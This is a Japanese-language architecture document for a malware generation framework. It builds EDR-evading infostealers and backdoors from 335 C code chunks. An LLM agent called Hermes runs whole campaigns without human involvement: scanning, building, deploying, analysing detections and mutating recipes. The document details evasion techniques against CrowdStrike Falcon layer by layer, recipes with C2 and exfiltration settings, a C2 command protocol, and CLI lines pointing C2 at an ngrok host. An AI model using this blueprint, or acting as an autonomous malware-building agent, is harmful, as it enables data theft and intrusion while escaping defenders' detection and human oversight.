# マルウェア生成フレームワーク — アーキテクチャドキュメント

## 1. 概要

本フレームワークは、EDR（Endpoint Detection and Response）で保護されたWindows環境に対して、検知回避型マルウェアを自動生成・テスト・検証するシステムです。

主要な構成要素は以下の3つです：

1. **チャンクアセンブラ** — 事前に検証済みのCコードチャンク（335個）をYAMLレシピに基づいて組み立て、単一のCソースファイルを生成し、コンパイルまで行う決定論的パイプラインです。ビルド時間は約5秒です。
2. **Hermes AIオーケストレータ** — LLM（大規模言語モデル）を搭載した自律エージェントで、23個のツールを駆使してキャンペーン全体を無人で実行します。ターゲットのスキャン、レシピ選択、ビルド、デプロイ、検知分析、レシピ変異、再試行までを自動的に行います。
3. **VMテスト環境** — CrowdStrike Falcon + Windows Defenderがインストールされた QEMU Windows 11仮想マシンで、実際のEDR製品に対してバイナリを検証します。

### 実績

- CrowdStrike Falcon + Windows Defenderの同時回避に成功（FUD: Fully Undetectable）
- 207,827バイトのデータ窃取に成功（システム情報、プロセス一覧、ブラウザデータ）
- 検知数: 0（静的検知・動的検知ともに回避）
- バイナリはディスク上に残存（実行後も削除されず）

### 規模

| 項目 | 数値 |
|------|------|
| コードチャンク総数 | 335個（16カテゴリ） |
| 回避チャンク | 110個 |
| レシピ | 176個 |
| バリアントグループ | 51グループ、199個のチャンク |
| ユニークバイナリ組み合わせ数 | 7.7×10²⁶通り |
| 出力フォーマット | PE (EXE), DLL, JScript, VBScript, Batch, CPL |
| コード行数 | Python 42,000行 + Cテンプレート 25,000行 |

---

## 2. アーキテクチャ図

```
┌─────────────────────────────────────────────────────────────┐
│                    Hermes AIオーケストレータ                    │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │ スキャン  │  │ 戦略選択  │  │ 検知分析  │  │ レシピ変異 │   │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘   │
│       │             │             │              │          │
│       └─────────────┴──────┬──────┴──────────────┘          │
│                            │                                │
│                     23個のツール                              │
└────────────────────────────┬────────────────────────────────┘
                             │
              ┌──────────────┴──────────────┐
              │                             │
              v                             v
┌──────────────────────┐      ┌──────────────────────┐
│  チャンクアセンブラ    │      │   難読化パイプライン   │
│                      │      │                      │
│  YAMLレシピ           │      │  light: 変数名変更    │
│    ↓                 │      │    + ジャンクコード    │
│  依存関係解決          │      │    + 文字列暗号化     │
│    ↓                 │      │                      │
│  テンプレート変数展開   │──→   │  heavy: + SEH        │
│    ↓                 │      │    + アンチデバッグ    │
│  単一 .c ファイル生成   │      │    + API難読化       │
│    ↓                 │      │                      │
│  リソース注入 (.rc)    │      │  max: + LLM書き換え  │
│    ↓                 │      └──────────┬───────────┘
│  コンパイル (MinGW)    │                │
│    ↓                 │                │
│  Rich Header注入      │                │
│    ↓                 │                │
│  タイムスタンプ改竄    │                │
└──────────┬───────────┘                │
           │                            │
           └────────────┬───────────────┘
                        │
                        v
           ┌──────────────────────┐
           │    デプロイ & テスト    │
           │                      │
           │  SCP → VM転送         │
           │  C2リスナー起動        │
           │  バイナリ実行          │
           │  EDR検知チェック       │
           │  結果分析              │
           └──────────────────────┘
```

---

## 3. チャンクアセンブラパイプライン

### 3.1 レシピ形式

レシピはYAMLファイルで定義され、どのチャンクを組み合わせるかを宣言的に指定します。

```yaml
name: infostealer_cs_pe_proven
description: CrowdStrike回避済みPEインフォスティーラー

core:
  - core/emit_buffer      # データバッファ管理
  - core/run_cmd           # コマンド実行ユーティリティ
  - core/file_ops          # ファイル操作

collectors:
  - collectors/system_info       # システム情報収集
  - collectors/processes         # プロセス一覧
  - collectors/browser_chromium  # Chromiumブラウザデータ
  - collectors/discord_tokens    # Discordトークン

exfil: exfil/tcp_direct          # TCP直接送信
arch: arch/sequential            # 順次実行アーキテクチャ
api_resolve: api_resolve/api_hash_ror13  # ROR13ハッシュによるAPI解決
resources: true                  # バージョン情報 + マニフェスト埋め込み

evasion:
  - evasion/etw_patch            # ETWパッチ（テレメトリ無効化）
  - evasion/sleep_ekko           # Ekkoスリープ難読化
  - evasion/hells_gate           # Hell's Gateシステムコール
  - evasion/stack_spoof          # スタックスプーフィング

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

### 3.2 チャンクカテゴリ

| カテゴリ | チャンク数 | 用途 |
|---------|----------|------|
| `collectors/` | 42 | データ収集（システム情報、ブラウザ、資格情報、スクリーンショットなど） |
| `evasion/` | 110 | 回避技術（ETWパッチ、間接システムコール、スリープ難読化など） |
| `arch/` | 26 | 実行アーキテクチャ（順次、スレッド、ファイバー、コールバック、バックドアなど） |
| `exfil/` | 22 | 送信方法（TCP、HTTP、DNS、SMB、LOLBinパイプなど） |
| `commands/` | 13 | バックドアコマンドハンドラ（API版 + LOLBin版） |
| `process/` | 9 | プロセス操作（PPIDスプーフィング、プロセスゴースティングなど） |
| `api_resolve/` | 7 | API解決方法（DJB2ハッシュ、FNV-1a、PEBウォーク、ROR13など） |
| `ad_collectors/` | 6 | Active Directoryデータ収集 |
| `c2/` | 5 | C2トランスポート（TCPビーコン、WinHTTPビーコン、DNSなど） |
| `core/` | 5 | 共通ユーティリティ（バッファ管理、コマンド実行、ファイル操作） |
| `persist/` | 7 | 永続化（レジストリ、スケジュールタスク、スタートアップフォルダなど） |
| `ad/` | 3 | Active Directoryクエリ基盤 |

### 3.3 アセンブリ処理

アセンブラ（`templates/chunks/assembler.py`、1,450行）は以下の手順でソースを生成します：

1. **レシピ解析** — YAMLファイルを読み込み、必要なチャンクを特定します
2. **依存関係解決** — 各チャンクのヘッダーコメント（`// depends: core/emit_buffer`）を解析し、依存するチャンクを自動的に追加します
3. **テンプレート変数展開** — `{{C2_IP}}`、`{{C2_PORT}}`などのプレースホルダーを実際の値に置換します
4. **ヘッダー統合** — 重複する`#include`を除去し、正しい順序で配置します（`winsock2.h` → `windows.h`の順序制約を遵守）
5. **ガード処理** — `#ifndef CHUNK_XXX` / `#endif`ガードにより、チャンク間の重複定義を防止します
6. **単一ファイル出力** — すべてのチャンクを1つの `.c` ファイルに結合します

### 3.4 コンパイル

MinGWクロスコンパイラを使用してWindows PEバイナリを生成します：

```bash
x86_64-w64-mingw32-gcc -mwindows -o payload.exe source.c \
    -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 \
    -lwininet -ldnsapi -static
```

- `-mwindows` + `FreeConsole()` — コンソールウィンドウを非表示にします
- `-static` — DLL依存を排除し、単一バイナリとして配布可能にします

### 3.5 リソース注入

`resources: true` が指定されたレシピでは、以下のリソースがバイナリに埋め込まれます：

- **バージョン情報** — 正規ソフトウェアに見せかけるためのファイルバージョン、製品名、会社名などのメタデータ。50種類のプロファイル（「Disk Optimization」「Token Broker」など）からランダムに選択されます
- **マニフェスト** — UAC対応のアプリケーションマニフェスト
- **Rich Header** — MinGWコンパイラのRich Headerを、Visual Studio互換のものに置換します。CrowdStrikeの静的MLモデルはRich Headerを分析するため、この偽装が重要です
- **タイムスタンプ改竄** — PEヘッダーのタイムスタンプをランダムな過去日付（2020〜2023年）に設定します

---

## 4. 回避システム

### 4.1 バリアントグループ

バリアントシステム（`templates/chunks/variants.yaml`）は、機能的に同等だがコードが異なるチャンクをグループ化します。`--randomize` フラグを使用すると、各グループから1つのチャンクがランダムに選択され、毎回構造的に異なるバイナリが生成されます。

51グループの例：

| グループ名 | バリアント数 | 内容 |
|-----------|------------|------|
| `syscall_gate` | 10 | indirect_syscall, hells_gate, tartarus_gate, syswhispers3, halos_gate, recycled_gate など |
| `sleep_obfuscation` | 8 | sleep_ekko, sleep_foliage, sleep_gargoyle, sleep_morpheus, sleep_cronos, sleep_deathsleep など |
| `stack_spoofing` | 7 | stack_spoof, stack_spoof_gadget, stack_spoof_loudsunrun, stack_spoof_rop, ret_spoof など |
| `anti_sandbox` | 7 | anti_sandbox, anti_sandbox_artifacts, anti_sandbox_network, anti_sandbox_timing, anti_vm など |
| `api_resolution` | 7 | api_hash_djb2, api_hash_fnv1a, peb_walk, api_hash_crc32, api_hash_ror13, api_set_redirect など |
| `etw_bypass` | 6 | etw_patch, etw_buffer_corrupt, etw_full_patch, etw_provider_unreg, etw_session_stop, hw_bp_etw |
| `anti_debug` | 6 | anti_debug, anti_debug_heap, anti_debug_hwbp, anti_debug_int3, anti_debug_ntquery など |

**組み合わせ空間：** 51グループ × 各グループのバリアント数 = **7.7×10²⁶通り**のユニークバイナリ

### 4.2 CrowdStrike検知レイヤーとの対応

CrowdStrike Falconは6層の検知メカニズムを持っています。本フレームワークは各層に対応するチャンクを提供します。

#### レイヤー1: 静的ML分析

PEのインポートテーブル、セクションエントロピー、Rich Header、リソース、署名を分析するMLモデルです。

| 対策チャンク | 機能 |
|------------|------|
| `resources` (50プロファイル) | 正規ソフトウェアのバージョン情報・マニフェストを埋め込む |
| `evasion/entropy_pad` | セクションエントロピーを正常範囲に調整 |
| `evasion/rich_header` | Visual Studio互換のRich Headerに置換 |
| `evasion/timestomp` | PEタイムスタンプを過去日付に改竄 |
| `evasion/checksum_spoof` | PEチェックサムを正しい値に設定 |
| `evasion/iat_pad` | インポートテーブルに良性APIを追加して水増し |
| `evasion/section_merge` | 疑わしいセクション名を標準名に統合 |
| `api_resolve/*` (7種) | 動的API解決により、IATから疑わしいAPI名を除去 |

**ステータス：** ✅ 実証済み

#### レイヤー2: ユーザーランドフック

ntdll.dllのNT*関数にインラインフックを配置し、API呼び出しを監視します。

| 対策チャンク | 機能 |
|------------|------|
| `evasion/indirect_syscall` | フック済みntdll関数を迂回してシステムコールを直接実行 |
| `evasion/hells_gate` | SSN（システムサービス番号）を動的に解決 |
| `evasion/tartarus_gate` | 隣接するシステムコールからSSNを推測 |
| `evasion/syswhispers3` | SysWhispers3方式のシステムコール |
| `evasion/syscall_trampoline` | ntdll内のsyscall命令をトランポリンとして使用 |
| `evasion/unhook_ntdll` | ntdll.dllをディスクから再読み込みしてフックを除去 |
| `evasion/unhook_peruns_fart` | Perun's Fart方式のアンフック |
| `evasion/unhook_knowndlls` | KnownDllsセクションからクリーンなntdllを取得 |
| `evasion/amsi_hwbp` | ハードウェアブレークポイントによるAMSIバイパス |

**ステータス：** ✅ 実証済み（indirect_syscall、hells_gateで確認）

#### レイヤー3: カーネルコールバック

csagent.sysドライバによるプロセス/スレッド/イメージ/レジストリの通知コールバックです。

| 対策チャンク | 機能 |
|------------|------|
| `evasion/process_masquerade` | プロセス情報を正規プロセスに偽装 |
| `evasion/herpaderp` | Process Herpaderping（ディスク上のイメージを実行後に書き換え） |
| `evasion/phantom_dll` | ファントムDLLによるイメージコールバック回避 |
| `process/ppid_spoof_*` (6種) | 親プロセスを偽装（explorer、svchost、taskhostwなど） |

**ステータス：** ⚠️ 一部実証済み

#### レイヤー4: 動的IOA（Indicators of Attack）

API呼び出しシーケンス、プロセスツリー、メモリ操作のパターンを検知します。

| 対策チャンク | 機能 |
|------------|------|
| `evasion/sleep_ekko` 他8種 | スリープ中にメモリを暗号化し、PAGE_NOACCESSに変更 |
| `evasion/stack_spoof` 他7種 | リターンアドレスを正規DLL内のアドレスに偽装 |
| `evasion/etw_patch` 他6種 | EtwEventWriteをパッチしてテレメトリを無効化 |
| `evasion/anti_debug` 他6種 | デバッガ検出とタイミングチェック |
| `evasion/anti_sandbox` 他7種 | サンドボックス/VM環境の検出と回避 |
| `evasion/behavioral_pacing` | API呼び出し間にランダム遅延を挿入 |
| `evasion/deferred_exec` | 起動時にランダムな遅延（10〜60秒） |

**ステータス：** ✅ 実証済み（sleep_ekko、stack_spoof、etw_patchで確認）

#### レイヤー5: クラウドML

ファイルのレピュテーション、脅威インテリジェンス、動的分析モデルです。

| 対策 | 機能 |
|------|------|
| `api_resolve` (必須) | IATから疑わしいAPIを除去 |
| `resources` + マニフェスト (必須) | 正規ソフトウェアのメタデータでMLスコアを低下させる |
| 複数出力フォーマット | PE以外のフォーマット（JScript、VBScriptなど）でPE特化検知を回避 |

**ステータス：** ✅ 実証済み

#### レイヤー6: メモリスキャン

Intel TDTアクセラレーテッドメモリスキャンによる、PEヘッダーとインジェクション痕跡の定期的なスキャンです。

| 対策チャンク | 機能 |
|------------|------|
| `evasion/header_stomp` | メモリ上のPEヘッダーを上書き |
| `evasion/module_stomp` | 署名済みDLLのメモリ領域にコードを配置 |
| `evasion/sleep_heap_encrypt` | スリープ中にヒープ上のデータを暗号化 |

**ステータス：** 🔬 理論段階（TDTに対する実地テスト未実施）

---

## 5. 難読化パイプライン

難読化モジュール（`templates/chunks/obfuscate.py` + `evasion_passes.py`）は、アセンブル後のソースコードにソースレベルの変換を適用します。4段階のレベルがあります。

### レベル一覧

| レベル | 変換内容 |
|-------|---------|
| `none` | 変換なし（パススルー） |
| `light` | ヘッダー整理 + ローカル変数リネーム + ジャンクコードブロック挿入 + 文字列リテラルXOR暗号化 |
| `heavy` | light + SEHラッパー + アンチデバッグ注入 + API呼び出し難読化 |
| `max` | heavy + LLMによるコード書き換え（関数リネーム、制御フロー変更、デッドコード挿入） |

### 各変換の詳細

- **変数リネーム** — ローカル変数をランダムな名前に変更します。`argc`、`argv`、Windows APIハンドル名などの保護変数は除外されます
- **ジャンクコードブロック** — `if`文や`return`文の前にランダムに挿入される、機能に影響しないコードブロックです（例：`GetTickCount()`の呼び出し結果を破棄）
- **整数リテラル分割** — `1024` → `(1000 + 24)` のように、定数を算術式に変換します
- **制御フロージャンク** — 常にfalseとなる条件分岐（opaque predicate）を挿入します
- **文字列暗号化** — すべての文字列リテラルをXORキーで暗号化し、実行時にスタック上で復号します。復号後にメモリをゼロクリアします
- **SEHラッパー** — main()の本体をワーカースレッドに移動し、未処理例外フィルタで保護します
- **LLM書き換え** — ローカルまたはクラウドLLMにコード全体を送信し、機能同等だが構造が異なるコードに書き換えます。書き換え後にコンパイルチェックを実行し、失敗した場合は元のコードにフォールバックします

### 耐障害性

EDRターゲットに対してアセンブルする場合、以下の安全機構が働きます：

- `randomize=True` と `obfuscation=light` 以上が**自動的に強制**されます（LLMエージェントがオーバーライドすることはできません）
- 難読化によってコンパイルが失敗した場合、**難読化前のソースで自動リトライ**します（バイナリはランダマイズにより依然としてユニーク）
- 以前コンパイルに失敗したレシピ×難読化レベルの組み合わせは記録され、次回以降スキップされます

---

## 6. Hermes AIオーケストレータ

### 6.1 概要

Hermes（`hermes/`ディレクトリ）は、Hermes Agentフレームワーク上に構築された自律型AIエージェントです。LLMのツール呼び出しループを使用して、マルウェアキャンペーン全体を人間の介入なしに実行します。

### 6.2 ツール一覧（23個）

| ツール名 | 機能 |
|---------|------|
| `scan_target` | ターゲットVMのOS、EDR製品、LOLBinを検出 |
| `list_edr_events` | Defender/CrowdStrikeのイベントログを取得 |
| `list_recipes` | 利用可能なレシピを一覧表示（テスト結果付き） |
| `list_chunks` | カテゴリ別のチャンク一覧 |
| `get_strategy` | EDRに応じた推奨フォーマットと回避戦略を取得 |
| `query_knowledge` | ナレッジDBから実証済みレシピ・失敗パターンを検索 |
| `sweep_matrix` | 回避マトリクスのスイープ実行 |
| `analyze_detection` | 検知タイプの分類と次の対策を提案 |
| `assemble` | レシピからバイナリをアセンブル＋コンパイル |
| `create_recipe` | 新しいレシピYAMLを作成 |
| `mutate_recipe` | 既存レシピの回避チャンクを変更 |
| `deploy_to_vm` | バイナリをVMにSCPで転送 |
| `start_c2_listener` | C2リスナーを起動（TCP/HTTP/TLV） |
| `read_file` | レシピやソースファイルの内容を読み取る |
| `execute_on_vm` | VM上でバイナリを実行 |
| `check_c2_data` | C2で受信したデータを確認 |
| `analyze_results` | 実行結果の総合分析（バイナリ残存、C2データ、検知数） |
| `cleanup_vm` | VM上のプロセス終了、バイナリ削除、タスク削除 |
| `write_experimental_code` | 実験的なCコードを記述 |
| `compile_experimental` | 実験コードをコンパイル |
| `save_innovation_report` | イノベーション結果をナレッジDBに保存 |

### 6.3 キャンペーンフロー

```
1. scan_target     → ターゲットのOS、EDR、LOLBinを特定
2. query_knowledge → 実証済みレシピと失敗パターンを確認
3. get_strategy    → EDRに応じた最適戦略を取得
4. assemble        → ランダマイズ + 難読化でバイナリをビルド
5. deploy_to_vm    → VMに転送（静的検知されたら即座に検出）
6. execute_on_vm   → バイナリを実行
7. check_c2_data   → C2データ受信を確認
8. analyze_results → バイナリ残存、C2データ、検知数を分析
9. analyze_detection → 検知された場合、検知レイヤーを特定
10. mutate_recipe  → 検知レイヤーに対応する回避チャンクを変更
11. → ステップ4に戻り、成功またはmax_rounds到達まで繰り返し
```

### 6.4 ナレッジの永続化

- **`knowledge.md`** — 実運用で得られた知見（SSH `\r`の問題、C2リスナーのタイミング、コンパイルの注意点など）
- **`hermes_knowledge.json`** — Hermesが自動的に記録する実証済みレシピと失敗パターン
- **レシピの`proven`/`fail`タグ** — 各レシピのテスト結果がレシピ一覧に表示されます

### 6.5 LLMサーバーフォールバック

Hermesは起動時にLLMサーバーの可用性とコンテキスト長を自動的にプローブします。メインサーバー（Blackwell、ポート11235）のコンテキストが不足している場合、LM Studio（ポート1234）などの代替サーバーに自動フォールバックします。プローブは実際のモデルとパディングされたテストペイロード（約12Kトークン）を使用して、コンテキスト制限を正確に検出します。

---

## 7. C2インフラストラクチャ

### 7.1 TCPビーコン（TLVプロトコル）

`c2/tcp_beacon.c` — バイナリデータの双方向通信に使用されるTLV（Type-Length-Value）プロトコルです。

```
ヘッダー: cmd_id (uint32) + payload_len (uint32) = 8バイト
ボディ:   payload_len バイト
```

コマンドID：

| ID | コマンド | 機能 |
|----|---------|------|
| 0x01 | heartbeat | 生存確認 |
| 0x02 | sysinfo | システム情報取得 |
| 0x03 | processes | プロセス一覧取得 |
| 0x04 | filelist | ディレクトリ一覧 |
| 0x05 | fileread | ファイル読み取り |
| 0x06 | filewrite | ファイル書き込み |
| 0x07 | screenshot | スクリーンショット取得 |
| 0x08 | registry | レジストリ列挙 |
| 0x09 | netinfo | ネットワーク情報 |
| 0x0A | exec | コマンド実行 |
| 0x0D | exit | 終了 |

ビーコン間隔はデフォルト30秒で、30〜120秒のジッターを持つ再接続ロジックを備えています。`getaddrinfo`を使用しているため、IPアドレスだけでなくホスト名（ngrokトンネルなど）にも対応しています。

### 7.2 WinHTTPビーコン

`c2/winhttp_beacon.c` — HTTPリクエストに見せかけたC2通信です。`WinHttpConnect`を使用し、正規のWebトラフィックと区別がつきにくい通信パターンを実現します。

### 7.3 ワンショット送信（Exfil）

インフォスティーラーなどの一回限りのデータ送信に使用されます。22種類の送信チャンクがあります：

- **TCP直接送信** (`exfil/tcp_direct`) — 生TCPソケットで全データを一括送信
- **HTTP POST** (`exfil/http_post`, `exfil/https_post`) — HTTP(S) POSTリクエスト
- **DNS送信** (`exfil/dns_exfil`, `exfil/dns_txt`) — DNSクエリにデータをエンコード
- **LOLBin** (`exfil/certutil_lolbin`, `exfil/curl_lolbin`, `exfil/bitsadmin_lolbin`など) — 正規のWindows標準ツールを経由した送信
- **その他** — 名前付きパイプ、SMB、OneDrive、ペーストサイトなど

---

## 8. VMテスト環境

### 8.1 構成

- **ハイパーバイザー** — QEMU/KVM + OVMF（UEFI） + swtpm（TPM 2.0）
- **OS** — Windows 11 Pro
- **EDR** — CrowdStrike Falcon（csagent + CSFalconService） + Windows Defender
- **ネットワーク** — QEMU User-mode networking（ゲスト→ホスト: 10.0.2.2）
- **アクセス** — SSH（ポート10022）、RDP（ポート13389）

### 8.2 スナップショット管理

`scripts/vm_snapshot.sh` を使用して、QMPプロトコル経由でスナップショットを管理します。

```bash
./scripts/vm_snapshot.sh save <name>      # スナップショット保存
./scripts/vm_snapshot.sh restore <name>   # スナップショット復元
./scripts/vm_snapshot.sh list             # スナップショット一覧
```

**重要：** `blockdev-snapshot-sync`によるオーバーレイ方式を使用します。`savevm`/`loadvm`は使用しません（pflashをクラッシュさせるため）。

### 8.3 ゴールドスナップショット

- `crowdstrike` — CrowdStrike Falcon + Defender + RDPが設定済みの状態。このスナップショットは**絶対に削除しないでください**。

---

## 9. 出力フォーマット

| フォーマット | 拡張子 | 用途 |
|------------|-------|------|
| PE (EXE) | `.exe` | 標準的な実行ファイル。CrowdStrike対策にはresources + api_resolveが必須 |
| DLL | `.dll` | DLLサイドローディング、rundll32経由の実行 |
| CPL | `.cpl` | コントロールパネルアプレット（`control.exe`経由で実行） |
| JScript | `.js` | `cscript.exe`経由で実行。信頼されたプロセスとして動作するためPE検知を回避 |
| VBScript | `.vbs` | `cscript.exe`/`wscript.exe`経由で実行 |
| Batch | `.bat` | LOLBin偵察スクリプト |

### 出力パッケージ

ビルド結果は `results/chunk_<type>_<timestamp>/` に格納されます：

```
results/chunk_infostealer_20260715_221129/
├── payload.exe       # コンパイル済みバイナリ
├── source.c          # 難読化済みCソース
├── recipe.yaml       # 使用したレシピ
├── resource.o        # コンパイル済みリソース
├── resource.rc       # リソーススクリプト
├── deploy.sh         # デプロイスクリプト
├── c2_server.py      # C2サーバー
├── c2_listener.sh    # C2リスナー（簡易版）
├── parse_exfil.py    # 受信データのパーサー
└── c2_capture.bin    # C2受信データ（テスト時）
```

---

## 10. CLIリファレンス

### チャンクアセンブラ

```bash
# 基本的なアセンブル + コンパイル
python -m malware_gen_framework chunk --recipe infostealer_full --compile

# ランダマイズ有効（毎回異なるバイナリ）
python -m malware_gen_framework chunk --recipe infostealer_full --compile --randomize

# 難読化レベル指定
python -m malware_gen_framework chunk --recipe infostealer_full --compile --obfuscate heavy

# 変数のオーバーライド
python -m malware_gen_framework chunk --recipe infostealer_full --compile \
    --var C2_IP=0.tcp.jp.ngrok.io --var C2_PORT=22301

# コンパイラ指定（MinGW または Zig）
python -m malware_gen_framework chunk --recipe infostealer_full --compile --compiler zig
```

### Hermesキャンペーン

```bash
# 自律キャンペーンの実行
python -m hermes --edr crowdstrike --malware-type infostealer --max-rounds 50
```

### Webポータル

```bash
# ポータル起動（Tailscaleアクセス対応）
python -m malware_gen_framework portal --port 7070 --host 0.0.0.0
```

### スナップショット管理

```bash
./scripts/vm_snapshot.sh save pre_test
./scripts/vm_snapshot.sh restore crowdstrike
./scripts/vm_snapshot.sh list
```

---

## 11. 主要ファイル一覧

### コアパイプライン

| ファイル | 行数 | 機能 |
|---------|------|------|
| `templates/chunks/assembler.py` | 1,450 | チャンクアセンブラ本体（依存解決、変数展開、コンパイル、リソース注入） |
| `templates/chunks/obfuscate.py` | 266 | 難読化エントリポイント（4レベル） |
| `evasion_passes.py` | 1,096 | 難読化の各パス（変数リネーム、ジャンク挿入、文字列暗号化、SEH、アンチデバッグ） |
| `templates/chunks/variants.yaml` | — | 51バリアントグループの定義 |
| `cli.py` | 1,027 | コマンドラインインターフェース |
| `compiler_selector.py` | — | MinGW/Zigコンパイラ選択ロジック |

### Hermes

| ファイル | 行数 | 機能 |
|---------|------|------|
| `hermes/tools.py` | 2,038 | 23個のツール実装（scan、assemble、deploy、analyze など） |
| `hermes/prompts.py` | 742 | システムプロンプト + ツール定義スキーマ |
| `hermes/hermes_agent_bridge.py` | 341 | Hermes Agentフレームワークとの接続（ツール登録、LLMフォールバック） |
| `hermes/config.py` | — | 設定管理 |
| `hermes/strategy.py` | — | EDR別戦略ツリー |
| `hermes/knowledge_db.py` | — | ナレッジDB管理 |
| `hermes/orchestrator.py` | — | オーケストレーション（レガシー、現在はhermes_agent_bridge経由） |

### ポータル

| ファイル | 行数 | 機能 |
|---------|------|------|
| `portal/app.py` | 2,171 | Flask Webサーバー + WebSocket |
| `portal/static/index.html` | — | フロントエンドUI |
| `portal/c2_listener.py` | — | C2リスナーモジュール |

### テンプレート

| ディレクトリ | 内容 |
|------------|------|
| `templates/chunks/recipes/` | 176個のYAMLレシピ |
| `templates/chunks/evasion/` | 110個の回避Cチャンク |
| `templates/chunks/collectors/` | 42個のデータ収集チャンク |
| `templates/chunks/arch/` | 26個の実行アーキテクチャチャンク |
| `templates/chunks/exfil/` | 22個の送信チャンク |
| `templates/chunks/commands/` | 13個のバックドアコマンドチャンク |
| `templates/chunks/c2/` | 5個のC2トランスポートチャンク |

### ナレッジ

| ファイル | 内容 |
|---------|------|
| `knowledge.md` | 実運用から得られた知見と注意事項 |
| `hermes_knowledge.json` | Hermesが自動記録するレシピテスト結果 |
| `docs/crowdstrike_falcon_evasion_research.md` | CrowdStrike Falconの回避研究 |
| `docs/malgen_skill_documentation.md` | フレームワーク全体のスキルドキュメント |

### スクリプト

| スクリプト | 機能 |
|----------|------|
| `scripts/vm_snapshot.sh` | QMP経由のVMスナップショット管理 |
| `scripts/c2_backdoor.py` | バックドアC2コントローラー（対話モード / 自動テスト） |
| `scripts/deploy_keylogger.sh` | キーロガーのRDPデプロイ自動化 |
| `scripts/deploy_infostealer.sh` | インフォスティーラーのデプロイ自動化 |
| `scripts/parse_exfil.py` | 受信バイナリデータのパース |
| `scripts/batch_fud_test.py` | ランダマイズバリアントのバッチテスト |
| `scripts/fud_collector.py` | FUDバイナリの自動収集 |
